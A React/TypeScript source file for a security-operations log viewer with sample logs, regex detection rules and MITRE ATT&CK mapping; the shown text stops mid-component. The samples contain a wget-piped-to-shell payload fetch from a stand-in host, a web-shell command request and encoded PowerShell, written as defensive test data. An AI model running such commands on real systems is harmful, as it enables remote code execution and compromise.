import { useEffect, useMemo, useRef, useState } from "react";
import { IntakeCard, SectionBar, Panel, SendToRow, IocInventory, Chip } from "@/components/soc";
import { StatusBar, ResultBanner, Empty, KeyFields, EvidenceCard } from "@/components/output";
import { useOutputFilter, OutputFilterBar, OutputFilter } from "@/components/soc/OutputFilter";
import { BulkActionBar, useSelection } from "@/components/soc/BulkActionBar";
import { parseLogs } from "@/api/backend";
import { copyText } from "@/lib/copy";
import {
  Database, FileText, ArrowRight, Zap, ShieldAlert, Activity, ListFilter,
  Download, X, Clock, Crosshair, Bug, Hash, ChevronDown, ChevronRight, Loader2,
  Check, Copy, Send,
} from "lucide-react";

const SAMPLES: Record<string, string> = {
  ssh: `Apr 25 10:10:10 arch sshd[123]: Failed password for invalid user admin from 8.8.8.8 port 4444 ssh2
Apr 25 10:10:14 arch sshd[124]: Failed password for invalid user admin from 8.8.8.8 port 4445 ssh2
Apr 25 10:10:42 arch sshd[126]: Failed password for invalid user admin from 8.8.8.8 port 4446 ssh2
Apr 25 10:11:44 arch sshd[125]: Accepted password for root from 1.1.1.1 port 55910 ssh2
Apr 25 10:14:02 arch bash[1337]: wget -qO- http://malhost.example/payload.sh | sh`,
  win4688: `Event ID: 4688
Provider: Microsoft-Windows-Security-Auditing
New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
Command Line: powershell.exe -NoP -EncodedCommand SQBFAFgA
Account Name: krish
Parent Process Name: C:\\Windows\\System32\\cmd.exe`,
  suricata: `{"timestamp":"2026-04-25T10:12:00Z","event_type":"alert","src_ip":"198.51.100.23","dest_ip":"10.0.0.5","alert":{"signature":"ET WEB_SERVER Possible SQL Injection Attempt","severity":2,"category":"Attempted SQL Injection"}}
{"timestamp":"2026-04-25T10:12:11Z","event_type":"alert","src_ip":"198.51.100.23","dest_ip":"10.0.0.5","alert":{"signature":"ET WEB_SERVER LFI /etc/passwd attempt","severity":1}}
{"timestamp":"2026-04-25T10:13:00Z","event_type":"alert","src_ip":"198.51.100.23","dest_ip":"10.0.0.5","alert":{"signature":"ET POLICY Outbound connection to可疑 IP","severity":2}}`,
  firewall: `2026-04-25 10:15:00 DROP TCP 203.0.113.88 443 10.0.0.5 54321 (C2_blocklist)
2026-04-25 10:15:15 DROP TCP 203.0.113.88 443 10.0.0.5 54322 (C2_blocklist)
2026-04-25 10:15:30 DROP TCP 203.0.113.88 443 10.0.0.5 54323 (C2_blocklist)
2026-04-25 10:16:00 ALLOW TCP 10.0.0.5 4444 51.15.0.100 3389 (outbound_rdp)`,
  sysmon: `Event ID: 1
Provider: Microsoft-Windows-Sysmon
Process GUID: {a1b2c3d4-1111-2222-3333-444455556666}
CommandLine: "C:\\Users\\victim\\AppData\\Local\\Temp\\update.exe" /silent
Image: C:\\Users\\victim\\AppData\\Local\\Temp\\update.exe
ParentImage: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe
User: DESKTOP-ABC\\victim

Event ID: 3
Protocol: tcp
SourceIp: 10.0.0.15
DestinationIp: 51.15.0.100
DestinationPort: 8080
Image: C:\\Users\\victim\\AppData\\Local\\Temp\\update.exe`,
  apache: `192.168.1.100 - - [25/Apr/2026:10:20:00 +0000] "GET /wp-login.php HTTP/1.1" 200 5432 "-" "Mozilla/5.0"
192.168.1.100 - - [25/Apr/2026:10:20:03 +0000] "GET /wp-login.php HTTP/1.1" 200 5432 "-" "Mozilla/5.0"
192.168.1.100 - - [25/Apr/2026:10:20:06 +0000] "GET /wp-login.php HTTP/1.1" 200 5410 "-" "Mozilla/5.0"
10.0.0.5 - - [25/Apr/2026:10:21:00 +0000] "POST /wp-admin/admin-ajax.php?action=upgrade HTTP/1.1" 200 78 "-" "curl/7.68"
10.0.0.5 - - [25/Apr/2026:10:21:02 +0000] "GET /shell.php?cmd=id HTTP/1.1" 200 45 "-" "curl/7.68"`,
};

type Tok = { k: "ip" | "port" | "user" | "proc" | "kw" | "str" | "num" | "punct" | "txt" | "ws"; v: string };
const KW = /\b(Failed|Accepted|Invalid|password|user|from|port|ssh2|alert|signature|severity|Provider|Event ID|Command Line|Account Name|Process Name|Parent Process Name|New Process Name|EncodedCommand|NoP|DROP|ALLOW|Protocol|SourceIp|DestinationIp|DestinationPort|Image|ParentImage|CommandLine|Process GUID|GET|POST|HTTP|Mozilla|curl|wget|bash|sudo)\b/;

function paint(line: string): Tok[] {
  const out: Tok[] = [];
  const re = /(\b(?:25[0-5]|2[0-4]\d|1?\d?\d)(?:\.(?:25[0-5]|2[0-4]\d|1?\d?\d)){3}\b)|("[^"]*")|(\bport\s+\d+\b)|(\b(?:powershell|cmd|sshd|bash|wmic|rundll32|mshta|curl|wget|chrome|update)(?:\.exe)?\b)|(\b\d+\b)|(\s+)|([\[\]\(\)\{\},:;\\\/])|([^\s\[\]\(\)\{\},:;\\\/]+)/gi;
  let m: RegExpExecArray | null;
  while ((m = re.exec(line))) {
    if      (m[1]) out.push({ k: "ip",    v: m[1] });
    else if (m[2]) out.push({ k: "str",   v: m[2] });
    else if (m[3]) out.push({ k: "port",  v: m[3] });
    else if (m[4]) out.push({ k: "proc",  v: m[4] });
    else if (m[5]) out.push({ k: "num",   v: m[5] });
    else if (m[6]) out.push({ k: "ws",    v: m[6] });
    else if (m[7]) out.push({ k: "punct", v: m[7] });
    else if (m[8]) {
      const w = m[8];
      if (KW.test(w)) out.push({ k: "kw",   v: w });
      else            out.push({ k: "txt",  v: w });
    }
  }
  return out;
}
const TOK_CLASS: Record<Tok["k"], string> = {
  ip:    "text-info underline decoration-info/40 underline-offset-2",
  port:  "text-accent",
  user:  "text-[color:var(--chart-4,var(--accent))]",
  proc:  "text-warning",
  kw:    "text-primary",
  str:   "text-success",
  num:   "text-foreground/80",
  punct: "text-muted-foreground",
  txt:   "text-foreground/85",
  ws:    "",
};

type FilterChip = { field: string; value: string };

const TS_RE = /\b\d{2}:\d{2}:\d{2}\b/;
type Range = "5m" | "15m" | "1h" | "all";
const RANGE_SEC: Record<Range, number> = { "5m": 300, "15m": 900, "1h": 3600, all: Number.POSITIVE_INFINITY };

const LOCALSTORE_CHIPS = "beyondlabs.logs.chips";
const LOCALSTORE_RANGE = "beyondlabs.logs.range";

function loadPersist<T>(key: string, fallback: T): T {
  try {
    const raw = localStorage.getItem(key);
    return raw ? (JSON.parse(raw) as T) : fallback;
  } catch { return fallback; }
}

function savePersist(key: string, value: unknown) {
  try { localStorage.setItem(key, JSON.stringify(value)); } catch {}
}

function readInitialPrefill(): string {
  try {
    const direct = localStorage.getItem("beyondlabs.logs.prefill") || "";
    if (direct) {
      localStorage.removeItem("beyondlabs.logs.prefill");
      return direct;
    }
    const raw = localStorage.getItem("beyondlabs.pendingArtifact");
    if (!raw) return "";
    const pending = JSON.parse(raw);
    const target = String(pending?.target || pending?.page || pending?.destination || "").toLowerCase();
    const shouldLoad = target.includes("logs") || target.includes("alert") || pending?.type === "log" || pending?.type === "alert" || pending?.type === "event";
    if (!shouldLoad) return "";
    localStorage.removeItem("beyondlabs.pendingArtifact");
    const value = pending?.content || pending?.text || pending?.raw_input || pending?.value || pending?.query || pending?.rule || pending?.event;
    if (typeof value === "string") return value;
    return value ? JSON.stringify(value, null, 2) : "";
  } catch { return ""; }
}

function tsToSec(t: string): number | null {
  const m = t.match(TS_RE);
  if (!m) return null;
  const [h, mm, s] = m[0].split(":").map(Number);
  return h * 3600 + mm * 60 + s;
}

function download(name: string, body: string, mime = "text/csv") {
  const blob = new Blob([body], { type: mime });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = name; document.body.appendChild(a); a.click(); a.remove();
  URL.revokeObjectURL(url);
}

function copy(val: string) {
  copyText(val ?? "");
}

/* ── Analysis engine ── */

interface Finding { sev: "destructive" | "warning" | "info"; title: string; reason: string; action: string; }
interface MitreMap { id: string; name: string; }

const TACTIC_FROM_ID: Record<string, string> = {
  T1110: "Credential Access", T1078: "Defense Evasion", T1190: "Initial Access",
  T1572: "Command and Control", T1059: "Execution", T1021: "Lateral Movement",
  T1204: "Execution", T1505: "Persistence", T1105: "Command and Control",
};

function deriveFindings(parsed: NonNullable<ReturnType<typeof parseInput>>): { findings: Finding[]; mitre: MitreMap[]; tacticCoverage: { tactic: string; techniques: string[]; count: number }[] } {
  const findings: Finding[] = [];
  const mitreSet = new Map<string, MitreMap>();
  const both = parsed.allLines.join(" ");

  if (parsed.failures >= 3) { findings.push({ sev: "warning", title: `SSH brute force — ${parsed.failures} failures`, reason: "Multiple failed SSH authentication attempts from external IP.", action: "Block source IP; review for successful logins." }); }
  if (parsed.failures >= 1) { mitreSet.set("T1110", { id: "T1110", name: "Brute Force" }); }
  if (/Accepted password/.test(both)) { findings.push({ sev: "destructive", title: "External SSH auth success", reason: "Successful external SSH login after failures — credential compromise likely.", action: "Force password reset; review lateral movement." }); }
  if (/EncodedCommand/.test(both)) { findings.push({ sev: "destructive", title: "Encoded PowerShell execution", reason: "Base64-encoded PowerShell command detected — defense evasion and code execution.", action: "Review parent process chain; check for persistence mechanisms." }); mitreSet.set("T1059.001", { id: "T1059.001", name: "Command and Scripting Interpreter: PowerShell" }); }
  if (/SQL Injection/.test(both)) { findings.push({ sev: "destructive", title: "SQL injection attempt", reason: "IDS alert for SQL injection against web server.", action: "Review WAF logs; check web server for successful exploitation." }); mitreSet.set("T1190", { id: "T1190", name: "Exploit Public-Facing Application" }); }
  if (/LFI/.test(both)) { findings.push({ sev: "warning", title: "LFI / file disclosure attempt", reason: "IDS alert for local file inclusion probe.", action: "Verify web app input sanitisation; check for exposed sensitive files." }); mitreSet.set("T1190", { id: "T1190", name: "Exploit Public-Facing Application" }); }
  if (/DROP/.test(both)) { findings.push({ sev: "info", title: "Blocked C2 traffic — firewall drops", reason: "Firewall blocked outbound connections to known C2 IP on port 443.", action: "Check if source host is compromised; review DNS logs for beacon domains." }); mitreSet.set("T1572", { id: "T1572", name: "Protocol Tunneling" }); }
  if (/outbound_rdp/.test(both)) { findings.push({ sev: "warning", title: "Outbound RDP detected", reason: "Internal host initiating outbound RDP — lateral movement or tunnel.", action: "Investigate host for signs of compromise; restrict outbound RDP." }); mitreSet.set("T1021.001", { id: "T1021.001", name: "Remote Desktop Protocol" }); }
  if (/AppData\\Local\\Temp/.test(both)) { findings.push({ sev: "warning", title: "Process from Temp directory", reason: "Executable spawned from AppData\\Local\\Temp — common malware staging path.", action: "Upload sample to sandbox; review parent chrome.exe for drive-by compromise." }); mitreSet.set("T1204.002", { id: "T1204.002", name: "User Execution: Malicious File" }); }
  if (/wp-login/.test(both)) { findings.push({ sev: "warning", title: "WordPress login brute force", reason: "Multiple requests to /wp-login.php from external IP — credential stuffing.", action: "Rate-limit wp-login; enable CAPTCHA; review for successful logins." }); mitreSet.set("T1110", { id: "T1110", name: "Brute Force" }); mitreSet.set("T1190", { id: "T1190", name: "Exploit Public-Facing Application" }); }
  if (/shell\.php\?cmd=/.test(both)) { findings.push({ sev: "destructive", title: "Web shell command execution", reason: "GET to /shell.php with cmd parameter — web shell installed on server.", action: "Immediate incident response: isolate host, capture disk/memory, review Apache access logs." }); mitreSet.set("T1505.003", { id: "T1505.003", name: "Web Shell" }); }
  if (/wget.*\|.*sh/.test(both)) { findings.push({ sev: "destructive", title: "Remote payload fetch + pipe to shell", reason: "Download cradle via wget piped to sh — live payload retrieval.", action: "Block outbound to malhost.example; review host for persistence." }); mitreSet.set("T1105", { id: "T1105", name: "Ingress Tool Transfer" }); }

  if (!findings.length) findings.push({ sev: "info", title: "No notable findings", reason: "Log slice does not match any detection rules.", action: "Widen the sample or adjust filters." });

  const tacticMap = new Map<string, { techniques: Set<string>; count: number }>();
  for (const m of mitreSet.values()) {
    const baseId = m.id.split(".")[0];
    const tactic = TACTIC_FROM_ID[baseId] ?? "Other";
    if (!tacticMap.has(tactic)) tacticMap.set(tactic, { techniques: new Set(), count: 0 });
    const entry = tacticMap.get(tactic)!;
    entry.techniques.add(m.id);
    entry.count++;
  }
  const tacticCoverage = Array.from(tacticMap.entries())
    .map(([tactic, data]) => ({ tactic, techniques: Array.from(data.techniques), count: data.count }))
    .sort((a, b) => b.count - a.count);

  return { findings, mitre: Array.from(mitreSet.values()), tacticCoverage };
}

interface ParsedLog {
  classification: string; allLines: string[]; secs: (number | null)[]; maxSec: number | null;
  ips: string[]; users: string[]; hosts: string[]; procs: string[]; events: string[]; sigs: string[];
  failures: number; mitre: string; urls: string[];
}

function parseInput(input: string): ParsedLog | null {
  const t = input.trim();
  if (!t) return null;
  const allLines = t.split("\n");
  const ips = Array.from(new Set(t.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g) ?? []));
  const users = Array.from(new Set((t.match(/(?:user|Account Name:)\s*([A-Za-z0-9_-]+)/g) ?? []).map((s) => s.split(/\s+/).pop() ?? "")));
  const hosts = Array.from(new Set(t.match(/\b[a-z][a-z0-9-]*\.[a-z]{2,}\b/gi) ?? []));
  const procs = Array.from(new Set(t.match(/(?:powershell|cmd|sshd|bash|wmic|rundll32|mshta|curl|wget|chrome|update)\.exe?/gi) ?? []));
  const events = Array.from(new Set(t.match(/Event ID:\s*\d+/g) ?? []));
  const sigs = Array.from(new Set((t.match(/"signature":"([^"]+)"/g) ?? []).map((s) => s.replace(/"signature":"|"/g, ""))));
  const urls = Array.from(new Set(t.match(/https?:\/\/[^\s"]+/g) ?? []));
  let classification = "Unknown log";
  if (/sshd\[/.test(t)) classification = "Linux SSH auth";
  else if (/Event ID:/i.test(t) && /Sysmon/i.test(t)) classification = "Sysmon event";
  else if (/Event ID:/i.test(t)) classification = "Windows Security event";
  else if (/event_type":"alert"/.test(t)) classification = "Suricata EVE";
  else if (/DROP|ALLOW/.test(t)) classification = "Firewall log";
  else if (/GET|POST|HTTP/.test(t)) classification = "Web access log";
  const failures = (t.match(/Failed password/gi) ?? []).length;
  const secs = allLines.map(tsToSec);
  const maxSec = secs.reduce<number | null>((m, s) => (s == null ? m : m == null ? s : Math.max(m, s)), null);
  let mitre = "—";
  if (/Failed password/i.test(t)) mitre = "T1110 Brute Force";
  else if (/EncodedCommand/i.test(t)) mitre = "T1059.001 PowerShell";
  else if (/SQL Injection/i.test(t)) mitre = "T1190 Exploit Public-Facing";
  else if (/DROP/i.test(t)) mitre = "T1572 Protocol Tunneling";
  else if (/wp-login/i.test(t)) mitre = "T1110 / T1190 Web brute";
  else if (/shell\.php/i.test(t)) mitre = "T1505.003 Web Shell";
  return { classification, allLines, secs, maxSec, ips, users, hosts, procs, events, sigs, failures, mitre, urls };
}

function genMarkdown(parsed: ParsedLog, findings: Finding[], mitre: MitreMap[]): string {
  const lines = [
    `# Log Analysis Report`,
    `**Classification:** ${parsed.classification}`,
    `**Generated:** ${new Date().toISOString()}`,
    "", "## Findings",
    ...findings.map((f) => `- [${f.sev.toUpperCase()}] ${f.title} — ${f.reason}`),
  ];
  if (mitre.length) lines.push("", "## MITRE ATT&CK", ...mitre.map((m) => `- ${m.id}: ${m.name}`));
  lines.push("", "## Entities", `- IPs: ${parsed.ips.join(", ") || "—"}`, `- Users: ${parsed.users.join(", ") || "—"}`, `- Processes: ${parsed.procs.join(", ") || "—"}`, `- Hosts: ${parsed.hosts.join(", ") || "—"}`, `- Signatures: ${parsed.sigs.join(", ") || "—"}`, `- URLs: ${parsed.urls.join(", ") || "—"}`);
  lines.push("", "## Raw Log", ...parsed.allLines);
  return lines.join("\n");
}

function renderEnrichment(er: Record<string, unknown> | null) {
  if (!er) return null;
  return (
    <Panel title="Backend Analysis Results" icon={Database} meta={`${(er.findings as unknown[] | undefined)?.length ?? 0} finding(s)`}>
      <KeyFields items={[
        { label: "Total lines", value: String(((er.summary as Record<string, unknown>)?.total_lines as number) ?? "\u2014") },
        { label: "Parsed entries", value: String(((er.summary as Record<string, unknown>)?.parsed_entries as number) ?? "\u2014") },
        { label: "Unique IPs", value: String(((er.summary as Record<string, unknown>)?.unique_ips as number) ?? "\u2014") },
        { label: "Unique URLs", value: String(((er.summary as Record<string, unknown>)?.unique_urls as number) ?? "\u2014") },
        { label: "Unique emails", value: String(((er.summary as Record<string, unknown>)?.unique_emails as number) ?? "\u2014") },
      ]} />
      {Array.isArray(er.findings) && (er.findings as unknown[]).length > 0 && (
        <div className="mt-3 space-y-2">
          <p className="text-mono ba-text-2xs uppercase tracking-widest text-muted-foreground">Backend Findings</p>
          {(er.findings as Array<Record<string, unknown>>).map((f, i) => (
            <EvidenceCard
              key={i}
              severity={f.severity === "high" ? "destructive" : f.severity === "medium" ? "warning" : "info"}
              title={f.title as string}
              reason={f.detail as string}
              action={(f.recommendation as string) ?? "Review in context."}
              limitation="Backend-assisted analysis"
            />
          ))}
        </div>
      )}
    </Panel>
  );
}

export function LogsViewer({ showSectionBars = true }: { showSectionBars?: boolean }) {
  const [input, setInput] = useState(() => readInitialPrefill());
  const [chips, setChips] = useState<FilterChip[]>(() => loadPersist<FilterChip[]>(LOCALSTORE_CHIPS, []));
  const [range, setRange] = useState<Range>(() => loadPersist<Range>(LOCALSTORE_RANGE, "all"));
  const { filterText, setFilterText, showFilter, setShowFilter } = useOutputFilter();
  const [notice, setNotice] = useState("");
  const [modal, setModal] = useState<{ title: string; subtitle?: string; data: unknown } | null>(null);
  const [expandedLine, setExpandedLine] = useState<number | null>(null);
  const [viewMode, setViewMode] = useState<"painted" | "raw" | "table">("painted");
  const [enrichEnabled, setEnrichEnabled] = useState(false);
  const [enrichResult, setEnrichResult] = useState<Record<string, unknown> | null>(null);
  const [enrichLoading, setEnrichLoading] = useState(false);
  const findingSel = useSelection();
  const noticeTimer = useRef<ReturnType<typeof setTimeout>>(undefined);

  const flash = (msg: string) => {
    setNotice(msg);
    clearTimeout(noticeTimer.current);
    noticeTimer.current = setTimeout(() => setNotice(""), 4000);
  };

  useEffect(() => {
    if (input) flash("Loaded pending artifact from handoff — review and filter below.");
  }, []);

  useEffect(() => {
    const handler = (e: KeyboardEvent) => { if (e.key === "Escape") { setExpandedLine(null); } };
    document.addEventListener("keydown", handler);
    return () => document.removeEventListener("keydown", handler);
  }, []);

  useEffect(() => { savePersist(LOCALSTORE_RANGE, range); }, [range]);
  useEffect(() => { savePersist(LOCALSTORE_CHIPS, chips); }, [chips]);

  useEffect(() => {
    if (!input.trim() || !enrichEnabled) return;
    const timer = setTimeout(() => {
      setEnrichLoading(true);
      parseLogs(input)
        .then((res) => setEnrichResult(res as Record<string, unknown>))
        .catch(() => setEnrichResult(null))
        .finally(() => setEnrichLoading(false));
    }, 600);
    return () => clearTimeout(timer);
  }, [enrichEnabled, input]);

  const parsed = useMemo(() => parseInput(input), [input]);

  const filteredLines = useMemo(() => {
    if (!parsed) return [];
    const limit = RANGE_SEC[range];
    return parsed.allLines
      .map((ln, i) => ({ ln, sec: parsed.secs[i], i }))
      .filter(({ ln, sec }) => {
        if (Number.isFinite(limit) && parsed.maxSec != null && sec != null && parsed.maxSec - sec > limit) return false;
        for (const c of chips) {
          if (!ln.toLowerCase().includes(c.value.toLowerCase())) return false;
        }
        return true;
      });
  }, [parsed, chips, range]);

  const addChip = (field: string, value: string) => {
    setChips((prev) => (prev.some((c) => c.field === field && c.value === value) ? prev : [...prev, { field, value }]));
  };
  const removeChip = (i: number) => setChips((prev) => prev.filter((_, j) => j !== i));

  const fieldSummary = useMemo(() => {
    if (!parsed) return [];
    const groups: { field: string; items: string[] }[] = [
      { field: "ip",   items: parsed.ips   },
      { field: "user", items: parsed.users },
      { field: "proc", items: parsed.procs },
      { field: "host", items: parsed.hosts },
      { field: "sig",  items: parsed.sigs  },
    ];
    return groups.map((g) => {
      const counts = g.items.map((v) => {
        const re = new RegExp(v.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "gi");
        return { v, n: (input.match(re) ?? []).length };
      }).sort((a, b) => b.n - a.n).slice(0, 5);
      return { field: g.field, unique: g.items.length, top: counts };
    });
  }, [parsed, input]);

  const { findings, mitre, tacticCoverage } = useMemo(() => parsed ? deriveFindings(parsed) : { findings: [] as Finding[], mitre: [] as MitreMap[], tacticCoverage: [] as { tactic: string; techniques: string[]; count: number }[] }, [parsed]);

  const handleSendTo = (page: string) => {
    try {
      localStorage.setItem("beyondlabs.pendingArtifact", JSON.stringify({
        type: "log_analysis",
        content: input,
        target: page,
        source: "Logs & Alerts",
        created_at: new Date().toISOString(),
      }));
    } catch {}
    flash(`Sent to ${page}`);
  };

  const exportCsv = () => {
    if (!parsed) return;
    const header = "line,timestamp,text";
    const rows = filteredLines.map(({ ln, sec, i }) => {
      const ts = sec != null ? `${String(Math.floor(sec / 3600)).padStart(2, "0")}:${String(Math.floor((sec % 3600) / 60)).padStart(2, "0")}:${String(sec % 60).padStart(2, "0")}` : "";
      return `${i + 1},${ts},"${ln.replace(/"/g, '""')}"`;
    });
    download(`logs-${Date.now()}.csv`, [header, ...rows].join("\n"));
  };

  return (
    <>
      {showSectionBars && (
        <SectionBar id="IN" label="Intake · raw log" meta={`${input.length} chars`} />
      )}
      <IntakeCard
        icon={FileText}
        title="Log Slice"
        value={input}
        onChange={setInput}
        rows={8}
        samples={[
          { key: "ssh", label: "SSH auth failure", hint: "failed password + accepted" },
          { key: "win4688", label: "Windows 4688", hint: "process creation" },
          { key: "suricata", label: "Suricata alert", hint: "EVE JSON" },
          { key: "firewall", label: "Firewall drop", hint: "C2 blocklist" },
          { key: "sysmon", label: "Sysmon EID 1", hint: "process create" },
        ]}
        onLoadSample={(k) => setInput(SAMPLES[k])}
        onFile={(txt) => { setInput(txt); flash(`Loaded file — ${txt.length.toLocaleString()} chars`); }}
        fileAccept=".log,.txt,.json,.csv"
        run={{ label: "parse", icon: Zap, hint: "⌘↵", onClick: () => {}, disabled: !input.trim() }}
        onClear={() => { setInput(""); setChips([]); }}
      />

      {/* Notice banner */}
      {notice && (
        <div className="flex items-center gap-2 rounded-md border border-primary/30 bg-primary/10 px-3 py-2">
          <span className="h-1.5 w-1.5 animate-pulse rounded-full bg-primary" />
          <span className="flex-1 text-mono ba-text-sm text-primary">{notice}</span>
          <button onClick={() => setNotice("")} className="text-primary/60 hover:text-primary" aria-label="dismiss"><X className="h-3 w-3" /></button>
        </div>
      )}

      {parsed && (
        <Panel title="Filter strip" icon={ListFilter} meta={`${filteredLines.length} / ${parsed.allLines.length} lines`} actions={
          <div className="flex items-center gap-1.5">
            <button onClick={() => { const md = genMarkdown(parsed, findings, mitre); const blob = new Blob([md], { type: "text/markdown" }); const url = URL.createObjectURL(blob); const a = document.createElement("a"); a.href = url; a.download = `log-report-${Date.now()}.md`; a.click(); URL.revokeObjectURL(url); }} disabled={filteredLines.length === 0} className="inline-flex items-center gap-1 rounded border border-border px-2 py-0.5 text-mono ba-text-2xs uppercase tracking-widest text-muted-foreground hover:text-foreground disabled:opacity-40">
              <Hash className="h-3 w-3" /> MD
            </button>
            <button onClick={exportCsv} disabled={filteredLines.length === 0} className="inline-flex items-center gap-1 rounded border border-border px-2 py-0.5 text-mono ba-text-2xs uppercase tracking-widest text-muted-foreground hover:text-foreground disabled:opacity-40">
              <Download className="h-3 w-3" /> CSV
            </button>
          </div>
        }>
          <div className="flex flex-wrap items-center gap-2">
            <span className="inline-flex items-center gap-1 text-mono ba-text-2xs uppercase tracking-widest text-muted-foreground"><Clock className="h-3 w-3" /> range</span>
            {(["5m", "15m", "1h", "all"] as Range[]).map((r) => (
              <button key={r} onClick={() => setRange(r)} className={"rounded border px-2 py-0.5 text-mono ba-text-2xs uppercase tracking-widest " + (range === r ? "border-primary bg-primary/10 text-primary" : "border-border text-muted-foreground hover:text-foreground")}>{r}</button>
            ))}
            <span className="mx-2 h-3 w-px bg-border" />
            <span className="text-mono ba-text-2xs uppercase tracking-widest text-muted-foreground">filters</span>
            {chips.length === 0 ? (
              <span className="text-mono ba-text-2xs text-muted-foreground/70">click any entity below to pin a filter</span>
            ) : (
              chips.map((c, i) => (
                <span key={i} className="inline-flex items-center gap-1 rounded border border-primary/40 bg-primary/10 px-2 py-0.5 text-mono ba-text-2xs text-primary">
                  <span className="text-primary/70">{c.field}=</span>{c.value}
                  <button onClick={() => removeChip(i)} className="ml-0.5 hover:text-foreground" aria-label="remove filter"><X className="h-3 w-3" /></button>
                </span>
              ))
            )}
            {chips.length > 0 && <button onClick={() => setChips([])} className="ml-1 text-mono ba-text-2xs uppercase tracking-widest text-muted-foreground hover:text-destructive">clear all</button>}
          </div>
        </Panel>
      )}

      <StatusBar stats={[
        { label: "Status", value: parsed ? "Parsed" : "Idle", tone: parsed ? "success" : "muted" },
        { label: "Lines", value: parsed ? `${filteredLines.length}/${parsed.allLines.length}` : 0 },
        { label: "Entities", value: parsed ? parsed.ips.length + parsed.users.length + parsed.procs.length : 0 },
        { label: "Window", value: range, tone: "muted" },
      ]} />
      <div className="flex items-center gap-2 px-1">
        <label className="flex items-center gap-1.5 text-mono ba-text-2xs cursor-pointer select-none">
          <input type="checkbox" checked={enrichEnabled} onChange={(e) => setEnrichEnabled(e.target.checked)} className="accent-primary" />
          backend analysis
          {enrichLoading && <Loader2 className="ml-0.5 inline h-3 w-3 animate-spin text-primary" />}
        </label>
        {enrichResult && <span className="text-mono ba-text-2xs text-success">done</span>}
      </div>

      {showSectionBars && (
        <SectionBar id="OT" label="Output · entities + findings" meta={parsed ? `${parsed.classification} · ${findings.length} finding(s)` : "awaiting input"} />
      )}

      {showFilter && (
        <OutputFilterBar
          filterText={filterText}
          onChange={setFilterText}
          onClear={() => setFilterText("")}
          onClose={() => { setShowFilter(false); setFilterText(""); }}
        />
      )}

      {!parsed ? (
        <Empty icon={Database} title="No log loaded" hint="Paste a few lines or load a sample to extract entities and a detection lead." />
      ) : (
        <OutputFilter query={filterText.toLowerCase()}>
        <div className="space-y-3">
          <div className="pointer-events-none select-none">
            <ResultBanner
              badge="log_decision"
              caseId={`BA-LG-${parsed.allLines.length}`}
              title={parsed.classification}
              subtitle={`Routing lead: ${parsed.mitre} · ${findings.length} detection(s)`}
              reasons={[
                parsed.failures > 0 ? `${parsed.failures} authentication failure(s)` : "",
                parsed.events.length ? parsed.events.join(", ") : "",
                parsed.urls.length ? `${parsed.urls.length} URL(s) extracted` : "",
                parsed.sigs[0] ?? "",
                findings.find((f) => f.sev === "destructive") ? `Critical finding: ${findings.find((f) => f.sev === "destructive")?.title}` : "",
              ].filter(Boolean) as string[]}
              metrics={[
                { label: "IPs", value: parsed.ips.length, tone: "primary" },
                { label: "Users", value: parsed.users.length },
                { label: "Procs", value: parsed.procs.length, tone: parsed.procs.length ? "warning" : "default" },
                { label: "Findings", value: findings.length, tone: findings.length > 0 ? "warning" : "default" },
              ]}
            />
          </div>

          {/* Tabbed log viewer */}
          <Panel title="Log viewer" icon={FileText} meta={`${filteredLines.length} line(s) shown`} collapsible storageKey="ba.panel.logs.viewer" defaultCollapsed={filteredLines.length > 200}
            actions={
              <div className="flex items-center gap-1">
                {(["painted", "raw", "table"] as const).map((m) => (
                  <button key={m} onClick={() => setViewMode(m)}
                    className={"rounded border px-2 py-0.5 text-mono ba-text-2xs uppercase tracking-widest transition-colors " +
                      (viewMode === m ? "border-primary/60 bg-primary/15 text-primary" : "border-divider-strong bg-card/40 text-muted-foreground hover:text-foreground")}>
                    {m}
                  </button>
                ))}
              </div>
            }>
            {filteredLines.length === 0 ? (
              <div className="rounded border border-border/50 bg-background/60 p-3 text-mono ba-text-sm text-muted-foreground">No lines match the active filters.</div>
            ) : viewMode === "painted" ? (
              <>
                <pre className="overflow-x-auto rounded border border-border/50 bg-background/60 p-3 text-mono ba-text-base leading-relaxed">
                  {filteredLines.map(({ ln, i }) => {
                    const isExpanded = expandedLine === i;
                    return (
                      <div key={i}>
                        <div
                          className={`flex cursor-pointer gap-3 rounded-sm transition-colors hover:bg-primary/[0.04] ${isExpanded ? "bg-primary/5" : ""}`}
                          onClick={() => setExpandedLine(isExpanded ? null : i)}
                        >
                          <span className="flex select-none items-start gap-1 pt-0.5 text-right text-muted-foreground/60" style={{ minWidth: 42 }}>
                            <span className="ba-text-2xs">{isExpanded ? <ChevronDown className="inline h-3 w-3" /> : <ChevronRight className="inline h-3 w-3" />}</span>
                            <span>{i + 1}</span>
                          </span>
                          <span className="flex-1">
                            {paint(ln).map((tk, j) => <span key={j} className={TOK_CLASS[tk.k]}>{tk.v}</span>)}
                          </span>
                        </div>
                        {isExpanded && (
                          <div className="ml-10 mb-2 mt-1 rounded border border-border/50 bg-card/40 p-2.5">
                            <div className="text-mono ba-text-2xs uppercase tracking-widest text-muted-foreground">Line {i + 1} · Actions</div>
                            <div className="mt-1.5 flex flex-wrap gap-1.5">
                              <button onClick={() => addChip("ip", ln.match(IPV4_RE)?.[0] ?? ln)} className="rounded border border-border bg-card/60 px-2 py-0.5 text-mono ba-text-2xs uppercase tracking-widest text-muted-foreground hover:text-foreground">Filter IP</button>
                              <button onClick={() => { copy(ln); flash("Line copied"); }} className="rounded border border-border bg-card/60 px-2 py-0.5 text-mono ba-text-2xs uppercase tracking-widest text-muted-foreground hover:text-foreground">Copy</button>
                              <button onClick={() => setModal({ title: "Line Detail", subtitle: `Line ${i + 1}`, data: { line_number: i + 1, text: ln, entities: { ips: ln.match(IPV4_RE) ?? [] } } })} className="rounded border border-border bg-card/60 px-2 py-0.5 text-mono ba-text-2xs uppercase tracking-widest text-muted-foreground hover:text-foreground">JSON</button>
                              <button onClick={() => handleSendTo("siem")} className="rounded border border-border bg-card/60 px-2 py-0.5 text-mono ba-text-2xs uppercase tracking-widest text-muted-foreground hover:text-foreground">Send to SIEM</button>
                            </div>
                          </div>
                        )}
                      </div>
                    );
                  })}
                </pre>
                <div className="mt-2 flex flex-wrap gap-2 text-mono ba-text-2xs text-muted-foreground">
